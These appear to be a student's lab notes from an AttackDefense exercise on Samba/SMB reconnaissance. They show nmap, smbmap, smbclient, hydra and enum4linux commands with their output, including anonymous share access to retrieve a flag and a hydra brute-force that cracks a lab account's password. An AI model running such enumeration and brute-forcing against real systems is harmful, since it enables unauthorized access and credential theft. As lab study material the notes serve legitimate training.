smb-enum-sessions.nse
smb-enum-shares.nse
smb-enum-users.nse
smb-flood.nse
smb-ls.nse
smb-mbenum.nse
smb-os-discovery.nse
smb-print-text.nse
smb-protocols.nse
smb-psexec.nse
smb-security-mode.nse
smb-server-stats.nse
smb-system-info.nse
smb-vuln-conficker.nse
smb-vuln-cve2009-3103.nse
smb-vuln-cve-2017-7494.nse
smb-vuln-ms06-025.nse
smb-vuln-ms07-029.nse
smb-vuln-ms08-067.nse
smb-vuln-ms10-054.nse
smb-vuln-ms10-061.nse
smb-vuln-ms17-010.nse
smb-vuln-regsvc-dos.nse
smb-vuln-webexec.nse
smb-webexec-exploit.nse


   #   Name                                         Disclosure Date  Rank    Check  Description
   -   ----                                         ---------------  ----    -----  -----------
   1   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal  Yes    DCOM Exec
   2   auxiliary/scanner/smb/impacket/secretsdump                    normal  Yes    DCOM Exec
   3   auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal  Yes    WMI Exec
   4   auxiliary/scanner/smb/pipe_auditor                            normal  Yes    SMB Session Pipe Auditor
   5   auxiliary/scanner/smb/pipe_dcerpc_auditor                     normal  Yes    SMB Session Pipe DCERPC Auditor
   6   auxiliary/scanner/smb/psexec_loggedin_users                   normal  Yes    Microsoft Windows Authenticated Logged In Users Enumeration
   7   auxiliary/scanner/smb/smb1                                    normal  Yes    SMBv1 Protocol Detection
   8   auxiliary/scanner/smb/smb2                                    normal  Yes    SMB 2.0 Protocol Detection
   9   auxiliary/scanner/smb/smb_enum_gpp                            normal  Yes    SMB Group Policy Preference Saved Passwords Enumeration
   10  auxiliary/scanner/smb/smb_enumshares                          normal  Yes    SMB Share Enumeration
   11  auxiliary/scanner/smb/smb_enumusers                           normal  Yes    SMB User Enumeration (SAM EnumUsers)
   12  auxiliary/scanner/smb/smb_enumusers_domain                    normal  Yes    SMB Domain User Enumeration
   13  auxiliary/scanner/smb/smb_login                               normal  Yes    SMB Login Check Scanner
   14  auxiliary/scanner/smb/smb_lookupsid                           normal  Yes    SMB SID User Enumeration (LookupSid)
   15  auxiliary/scanner/smb/smb_ms17_010                            normal  Yes    MS17-010 SMB RCE Detection
   16  auxiliary/scanner/smb/smb_uninit_cred                         normal  Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   17  auxiliary/scanner/smb/smb_version                             normal  Yes    SMB Version Detection


1. Enumerating SAMBA service running and its version, Hostname, worgroup name, OS details
2. Enumerating SMB security level (User-level authentication, Share-level authentication, Challenge/response passwords supported, Message signing )
3. Enumerate domains,(password poolicy)
3. Enumerate Users wihtout auth usinf guest account if allowed
4. Enumerate shares and their permissions and contents wihtout auth usinf guest account if allowed
5. Enumerate content of share accessible without authentication
5. Brute force to get the credentials to access share that requires authentication
6. Enumerate content of share accessible with authentication
7. Enumerate the SIDs of users

root@attackdefense:~# `nmap 192.77.43.3 --script smb-protocols`
root@attackdefense:~# `nmap 192.77.43.3 -p 445 -sV ` 
root@attackdefense:~# `nmap 192.77.43.3 -p 445 --script smb-os-discovery`
root@attackdefense:~# `nmap 192.77.43.3 -p 445 --script smb-security-mode`
root@attackdefense:~# `nmap 192.77.43.3 -p 445 --script smb2-security-mode`
root@attackdefense:~# `nmap 192.34.68.3 -p 445 --script smb-enum-domains`
root@attackdefense:~# `nmap 192.77.43.3 -p 445 --script smb-enum-users `
root@attackdefense:~#` nmap 192.77.43.3 -p 445 --script smb-enum-shares,smb-ls`
root@attackdefense:~# `smbmap -H 192.77.43.3 `
root@attackdefense:~# `smbclient -L 192.77.43.3` 
root@attackdefense:~# `smbclient //192.77.43.3/public -N`
root@attackdefense:~# `hydra -l john -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.77.43.3 smb`
root@attackdefense:~# `smbclient //192.77.43.3/john -U john`
root@attackdefense:~# `enum4linux -r -u john -p password1 192.34.68.3`

# Questions
How knowing workgroup name helps?

***************************************************************************************************************************************************
root@attackdefense:~# `nmap 192.77.43.3 --script smb-protocols`
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-03 05:27 UTC
Nmap scan report for target-1 (192.77.43.3)
Host is up (0.000014s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:4D:2B:03 (Unknown)

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.02
|     2.10
|     3.00
|     3.02
|_    3.11

Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds
root@attackdefense:~# `nmap 192.77.43.3 -p 445 -sV `           
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-03 05:29 UTC
Nmap scan report for target-1 (192.77.43.3)
Host is up (0.000067s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
MAC Address: 02:42:C0:4D:2B:03 (Unknown)
Service Info: Host: SAMBA-RECON

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.46 seconds
root@attackdefense:~# 

root@attackdefense:~# `nmap 192.77.43.3 -p 445 --script smb-os-discovery`
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-03 06:05 UTC
Nmap scan report for target-1 (192.77.43.3)
Host is up (0.000058s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:4D:2B:03 (Unknown)

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: victim-1
|   NetBIOS computer name: SAMBA-RECON\x00
|   Domain name: \x00
|   FQDN: victim-1
|_  System time: 2024-01-03T06:05:14+00:00

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
root@attackdefense:~# 

root@attackdefense:~# `nmap 192.77.43.3 -p 445 --script smb-security-mode`
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-03 05:46 UTC
Nmap scan report for target-1 (192.77.43.3)
Host is up (0.000069s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:4D:2B:03 (Unknown)

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
root@attackdefense:~# `nmap 192.77.43.3 -p 445 --script smb2-security-mode`
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-03 05:46 UTC
Nmap scan report for target-1 (192.77.43.3)
Host is up (0.000052s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:4D:2B:03 (Unknown)

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
root@attackdefense:~# 

root@attackdefense:~# `nmap 192.34.68.3 --script smb-enum-domains`
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-03 11:24 UTC
Nmap scan report for target-1 (192.34.68.3)
Host is up (0.0000090s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:22:44:03 (Unknown)

Host script results:
| smb-enum-domains: 
|   SAMBA-RECON
|     Groups: Testing
|     Users: john, elie, aisha, shawn, emma, admin
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|     Account lockout disabled
|   Builtin
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|_    Account lockout disabled

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds

root@attackdefense:~# `nmap 192.77.43.3 -p 445 --script smb-enum-users `
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-03 06:25 UTC
Nmap scan report for target-1 (192.77.43.3)
Host is up (0.000038s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:4D:2B:03 (Unknown)

Host script results:
| smb-enum-users: 
|   SAMBA-RECON\admin (RID: 1005)
|     Full name:   
|     Description: 
|     Flags:       Normal user account
|   SAMBA-RECON\aisha (RID: 1004)
|     Full name:   
|     Description: 
|     Flags:       Normal user account
|   SAMBA-RECON\elie (RID: 1002)
|     Full name:   
|     Description: 
|     Flags:       Normal user account
|   SAMBA-RECON\emma (RID: 1003)
|     Full name:   
|     Description: 
|     Flags:       Normal user account
|   SAMBA-RECON\john (RID: 1000)
|     Full name:   
|     Description: 
|     Flags:       Normal user account
|   SAMBA-RECON\shawn (RID: 1001)
|     Full name:   
|     Description: 
|_    Flags:       Normal user account

Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
root@attackdefense:~# 

root@attackdefense:~#` nmap 192.77.43.3 -p 445 --script smb-enum-shares,smb-ls`
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-03 06:42 UTC
Nmap scan report for target-1 (192.77.43.3)
Host is up (0.000092s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:4D:2B:03 (Unknown)

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\192.77.43.3\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (samba.recon.lab)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\192.77.43.3\aisha: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\aisha
|     Anonymous access: <none>
|     Current user access: <none>
|   \\192.77.43.3\emma: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\emma
|     Anonymous access: <none>
|     Current user access: <none>
|   \\192.77.43.3\everyone: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\everyone
|     Anonymous access: <none>
|     Current user access: <none>
|   \\192.77.43.3\john: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\john
|     Anonymous access: <none>
|     Current user access: <none>
|   \\192.77.43.3\public: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\public
|     Anonymous access: READ/WRITE
|_    Current user access: READ/WRITE
| smb-ls: Volume \\192.77.43.3\public
| SIZE   TIME                 FILENAME
| <DIR>  2024-01-03 06:42:42  .
| <DIR>  2018-11-27 13:36:13  ..
| <DIR>  2018-11-27 13:36:13  dev
| <DIR>  2018-11-27 13:36:13  secret
| 33     2018-11-27 13:36:13  secret\flag
|_

Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds

root@attackdefense:~# `smbmap -H 192.77.43.3 `
[+] Finding open SMB ports....
[+] Guest SMB session established on 192.77.43.3...
[+] IP: 192.77.43.3:445 Name: target-1                                          
        Disk                                                    Permissions
        ----                                                    -----------
        public                                                  READ, WRITE
        john                                                    NO ACCESS
        aisha                                                   NO ACCESS
        emma                                                    NO ACCESS
        everyone                                                NO ACCESS
        IPC$                                                    NO ACCESS
root@attackdefense:~# `smbclient -L 192.77.43.3` 
Enter WORKGROUP\GUEST's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        john            Disk      
        aisha           Disk      
        emma            Disk      
        everyone        Disk      
        IPC$            IPC       IPC Service (samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            SAMBA-RECON

root@attackdefense:~# `smbclient //192.77.43.3/public -N`
Try "help" to get a list of possible commands.
smb: \> `ls`
  .                                   D        0  Wed Jan  3 06:42:42 2024
  ..                                  D        0  Tue Nov 27 13:36:13 2018
  dev                                 D        0  Tue Nov 27 13:36:13 2018
  secret                              D        0  Tue Nov 27 13:36:13 2018

                1981084628 blocks of size 1024. 195950316 blocks available
smb: \> `cd secret`
smb: \secret\> `ls`
  .                                   D        0  Tue Nov 27 13:36:13 2018
  ..                                  D        0  Wed Jan  3 06:42:42 2024
  flag                                N       33  Tue Nov 27 13:36:13 2018

                1981084628 blocks of size 1024. 195950312 blocks available
smb: \secret\> `get flag`
getting file \secret\flag of size 33 as flag (32.2 KiloBytes/sec) (average 32.2 KiloBytes/sec)
smb: \secret\> `exit`
root@attackdefense:~# `cat flag`
03ddb97933e716f5057a18632badb3b4
root@attackdefense:~# 

root@attackdefense:~# `hydra -l john -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.77.43.3 smb`
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-03 06:59:41
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 50 login tries (l:1/p:50), ~50 tries per task
[DATA] attacking smb://192.77.43.3:445/
[445][smb] host: 192.77.43.3   login: john   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-03 06:59:42

root@attackdefense:~# `smbclient //192.77.43.3/john -U john`
Enter WORKGROUP\john's password: 
Try "help" to get a list of possible commands.
smb: \> `ls`
  .                                   D        0  Tue Nov 27 13:36:13 2018
  ..                                  D        0  Tue Nov 27 13:36:13 2018
  doe                                 D        0  Tue Nov 27 13:36:13 2018
  alt                                 D        0  Tue Nov 27 13:36:13 2018

                1981084628 blocks of size 1024. 195813792 blocks available
smb: \> `help`
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> `exit`
root@attackdefense:~# 

root@attackdefense:~# `enum4linux -r -u john -p password1 192.34.68.3`
[+] Enumerating users using SID S-1-22-1 and logon username 'john', password 'password1'
S-1-22-1-1000 Unix User\john (Local User)
S-1-22-1-1001 Unix User\shawn (Local User)
S-1-22-1-1002 Unix User\elie (Local User)
S-1-22-1-1003 Unix User\emma (Local User)
S-1-22-1-1004 Unix User\aisha (Local User)
S-1-22-1-1005 Unix User\admin (Local User)
enum4linux complete on Wed Jan  3 11:53:14 2024